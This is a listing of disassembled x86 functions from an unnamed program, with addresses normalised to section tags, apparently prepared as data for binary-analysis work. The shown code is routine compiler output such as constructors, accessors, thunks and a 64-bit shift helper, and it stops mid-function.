test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_43af80
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov edx eax
xor eax eax
and cl 0x1f
shl edx cl
retn
shld edx eax cl
shl eax cl
retn
sub_43c590
push ebp
mov ebp esp
push sub_401830
push sub_40ffa0
push 0x2800
push 0x18
push rw-data
call sub_423ed3
push sub_43c890
call sub_4226f3
add esp 0x4
pop ebp
retn
sub_401000
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
pop ebp
retn
sub_401010
push ebp
mov ebp esp
pop ebp
retn
sub_4010d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov dl [ ecx ]
mov [ eax ] dl
pop ebp
retn
sub_4010e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_401100
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_401120
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov esp ebp
pop ebp
retn
sub_401300
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_401100
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_401320
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax r--data
mov esp ebp
pop ebp
retn
sub_4013c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_401120
mov esp ebp
pop ebp
retn
sub_4013e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_401300
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_401400
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax r--data
mov esp ebp
pop ebp
retn
sub_4014a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_4013c0
mov esp ebp
pop ebp
retn
sub_4014c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_401300
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4014e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax r--data
mov esp ebp
pop ebp
retn
sub_4015a0
push ebp
mov ebp esp
mov eax rw-data
pop ebp
retn
sub_4015b0
push ebp
mov ebp esp
mov eax rw-data
pop ebp
retn
sub_401a40
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_401dc0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_401d20
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push r--data
call sub_421624
sub_401d31
mov esp ebp
pop ebp
retn
sub_401d40
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_401a30
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_401d60
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_402080
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_401da0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
call sub_402060
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_401dc0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x14 ] 0x0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_401f38
push 0x0
push 0x1
mov ecx [ ebp - 0x1c ]
call sub_401990
push 0x0
push 0x0
call sub_42569b
mov eax sub_401f5c
retn
sub_401f5c
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
sub_402040
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push r--data
call sub_4215f6
sub_402051
mov esp ebp
pop ebp
retn
sub_402060
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_402080
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_402090
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call j_sub_422732#2
add esp 0x4
mov esp ebp
pop ebp
retn 0x8
sub_4020b0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_4020f0
mov esp ebp
pop ebp
retn 0x4
sub_4020d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
call sub_402110
add esp 0x4
mov esp ebp
pop ebp
retn
sub_4020f0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_402190
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_402110
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_402120
pop ebp
retn
sub_402120
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
or eax 0xffffffff
mov esp ebp
pop ebp
retn
sub_4021f0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_4022a0
pop ebp
retn
sub_4022a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov esp ebp
pop ebp
retn 0x4
sub_402300
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] 0x0
pop ebp
retn
sub_4035b0
push ebp
mov ebp esp
push 0x0
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_403530
add esp 0xc
pop ebp
retn
sub_4035d0
push ebp
mov ebp esp
push 0x1
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_403530
add esp 0xc
pop ebp
retn
sub_4038e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_403870
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] sub_4038b0
pop ebp
retn
sub_403900
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x10
push eax
call sub_402300
add esp 0x4
pop ebp
retn
sub_407820
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
push 0x30e
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4227fc
add esp 0xc
pop ebp
retn
sub_407bb0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x0
pop ebp
retn
sub_40b430
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24 ] 0x0
push 0x1
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40b3d0
add esp 0xc
pop ebp
retn
sub_40bd30
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov dx [ ecx ]
mov [ eax ] dx
pop ebp
retn
sub_40c4a8
push 0x0
push 0x1
mov ecx [ ebp - 0x1c ]
call sub_40c030
push 0x0
push 0x0
call sub_42569b
mov eax sub_40c4cc
retn
sub_40c4cc
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
sub_40c570
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c5b0
mov esp ebp
pop ebp
retn 0x4
sub_40c590
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
call sub_40c5d0
add esp 0x4
mov esp ebp
pop ebp
retn
sub_40c5b0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_40c5f0
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_40c5d0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_40c5e0
pop ebp
retn
sub_40c5e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax 0x7fffffff
mov esp ebp
pop ebp
retn
sub_40c990
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4237c0
add esp 0x8
pop ebp
retn
sub_40ca90
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
movsx ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_427900
add esp 0xc
pop ebp
retn
sub_40cb70
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] 0x0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40cba0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40cbc0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40cb60
mov esp ebp
pop ebp
retn
sub_40cca0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
pop ebp
retn
sub_40cd50
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_423991
mov esp ebp
pop ebp
retn
sub_40cf40
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov esp ebp
pop ebp
retn
sub_40d000
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x4
mov ecx 0x1
[ eax ] ecx
mov esp ebp
pop ebp
retn
sub_40d0c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x4 ]
call sub_40cf40
mov esp ebp
pop ebp
retn
sub_40d280
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40d2d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov ecx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
call eax
mov esp ebp
pop ebp
retn
sub_40d2f0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x4 ]
call sub_40d0c0
mov esp ebp
pop ebp
retn
sub_40d310
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
xor al al
mov esp ebp
pop ebp
retn
sub_40d320
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax 0x1
mov esp ebp
pop ebp
retn
sub_40d390
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x4 ]
call sub_40d0c0
mov esp ebp
pop ebp
retn
sub_40d750
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov al [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_40d790
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov al [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x8
sub_40d8d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40cd50
mov esp ebp
pop ebp
retn
sub_40d8f0
push ebp
mov ebp esp
mov eax rw-data
pop ebp
retn
sub_40da70
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40d980
mov esp ebp
pop ebp
retn 0x4
sub_40da90
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov esp ebp
pop ebp
retn
sub_40dae0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40da90
and eax 0x1
mov esp ebp
pop ebp
retn
sub_40dbe0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40dce0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40d8d0
mov esp ebp
pop ebp
retn
sub_40dd70
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov esp ebp
pop ebp
retn 0x4
sub_40ddc0
push ebp
mov ebp esp
push 0xa
mov ecx [ ebp + 0x8 ]
call sub_410470
mov ecx [ ebp + 0x8 ]
call sub_4105b0
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_40dde0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_410800
mov esp ebp
pop ebp
retn
sub_40df70
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov esp ebp
pop ebp
retn 0x1c
sub_40dfc0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_40e000
mov esp ebp
pop ebp
retn 0x4
sub_40dfe0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_410f50
mov esp ebp
pop ebp
retn
sub_40e030
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_40e070
mov esp ebp
pop ebp
retn 0x4
sub_40e050
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_40e090
mov esp ebp
pop ebp
retn 0x4
sub_40e070
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_40e0b0
mov esp ebp
pop ebp
retn 0x4
sub_40e090
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_40e0d0
mov esp ebp
pop ebp
retn 0x4
sub_40e100
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x1
mov ecx [ ebp - 0x4 ]
call sub_40e140
mov esp ebp
pop ebp
retn 0x4
sub_40e120
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_411070
mov esp ebp
pop ebp
retn
sub_40e140
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_40e160
mov esp ebp
pop ebp
retn 0x4
sub_40e160
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_40e180
mov esp ebp
pop ebp
retn 0x4
sub_40e180
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] 0x0
mov esp ebp
pop ebp
retn 0x4
sub_40f9c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
add ecx 0x4
call sub_401830
mov esp ebp
pop ebp
retn
sub_40f9e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4101d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_412300
mov esp ebp
pop ebp
retn 0x4
sub_4102c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] 0x0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4102e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_4125e0
mov esp ebp
pop ebp
retn
sub_410450
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
call [ ebp + 0x8 ]
add esp 0x4
mov esp ebp
pop ebp
retn 0x4
sub_41052e
push 0x1
push 0x4
mov ecx [ ebp - 0x20 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x20 ]
add ecx [ edx + 0x4 ]
call sub_410690
mov eax r-xdata
retn
sub_410670
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x4 ]
call sub_40dbc0
mov esp ebp
pop ebp
retn
sub_4109a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
call sub_40cb50
mov esp ebp
pop ebp
retn 0x4
sub_4109c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
xor eax eax
xor edx edx
mov esp ebp
pop ebp
retn
sub_4109d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
call sub_40cb50
mov esp ebp
pop ebp
retn
sub_410d30
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0xc
sub_410d40
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
xor eax eax
mov esp ebp
pop ebp
retn
sub_410f50
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
add ecx 0x8
call sub_4134a0
mov ecx [ ebp - 0x4 ]
call sub_4133c0
mov esp ebp
pop ebp
retn
sub_410f90
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_413410
push 0x8
mov ecx [ ebp - 0x4 ]
call sub_413340
mov esp ebp
pop ebp
retn
sub_410fd0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_4134c0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_410ff0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_4134f0
mov esp ebp
pop ebp
retn
sub_411010
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_413520
mov esp ebp
pop ebp
retn
sub_411030
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_413630
mov esp ebp
pop ebp
retn 0x4
sub_411050
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_413590
mov esp ebp
pop ebp
retn
sub_411070
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_413730
mov ecx [ ebp - 0x4 ]
call sub_413820
mov esp ebp
pop ebp
retn
sub_411200
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
add ecx 0x10
call sub_4138b0
mov esp ebp
pop ebp
retn
sub_411fe0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
add ecx 0x4
call sub_4138b0
mov esp ebp
pop ebp
retn
sub_412140
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_401830
mov esp ebp
pop ebp
retn
sub_412740
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40dbe0
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4129c9
push 0x1
push 0x4
mov ecx [ ebp - 0x1c ]
mov edx [ ecx ]
mov ecx [ ebp - 0x1c ]
add ecx [ edx + 0x4 ]
call sub_410690
mov eax r-xdata
retn
sub_412c0c
push 0x1
push 0x4
mov ecx [ ebp - 0x24 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x24 ]
add ecx [ edx + 0x4 ]
call sub_410690
mov eax r-xdata
retn
sub_412d10
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov ecx [ ebp - 0x4 ]
mov eax [ edx + 0x34 ]
call eax
mov esp ebp
pop ebp
retn
sub_412e20
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
mov eax [ ecx ]
mov esp ebp
pop ebp
retn
sub_412e40
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
mov eax [ ecx ]
mov esp ebp
pop ebp
retn
sub_4133c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_414770
mov ecx [ ebp - 0x4 ]
call sub_414120
mov esp ebp
pop ebp
retn
sub_4134a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_4148b0
mov esp ebp
pop ebp
retn
sub_413820
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_414c80
mov ecx [ ebp - 0x4 ]
call sub_414140
mov esp ebp
pop ebp
retn
sub_413db0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_414d40
push eax
call sub_414df0
add esp 0x4
mov esp ebp
pop ebp
retn
sub_413dd0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_4011a0
mov esp ebp
pop ebp
retn
sub_413f50
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x8 ]
mov edx [ ecx + 0xc ]
mov esp ebp
pop ebp
retn
sub_414020
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x4 ]
call sub_40d2f0
mov esp ebp
pop ebp
retn
sub_414040
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov al 0x1
mov esp ebp
pop ebp
retn
sub_4140d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
xor eax eax
mov esp ebp
pop ebp
retn 0x10
sub_414120
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_414840
mov esp ebp
pop ebp
retn
sub_414140
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40cbc0
mov esp ebp
pop ebp
retn
sub_41439a
mov eax r-xdata
retn
sub_4143d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov esp ebp
pop ebp
retn
sub_414730
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
movzx eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_402080
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
sub_414750
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_415000
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_414770
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_413410
mov esp ebp
pop ebp
retn
sub_414840
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_415020
mov esp ebp
pop ebp
retn
sub_414870
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_4151a0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_414ce0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_415240
mov esp ebp
pop ebp
retn 0x4
sub_414d00
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
sub eax 0x1
and eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_414dd0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_4153e0
mov esp ebp
pop ebp
retn
sub_414df0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_402180
add esp 0x4
pop ebp
retn
sub_414fa0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_415000
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_415460
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_4150a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x8
pop ebp
retn
sub_4151a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_415640
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_415220
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push r--data
call sub_4215f6
sub_415231
mov esp ebp
pop ebp
retn
sub_415240
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_416ce0
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_4152c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_415690
mov esp ebp
pop ebp
retn 0x4
sub_415340
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push ecx
call sub_4150a0
add esp 0x4
mov esp ebp
pop ebp
retn
sub_4154c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
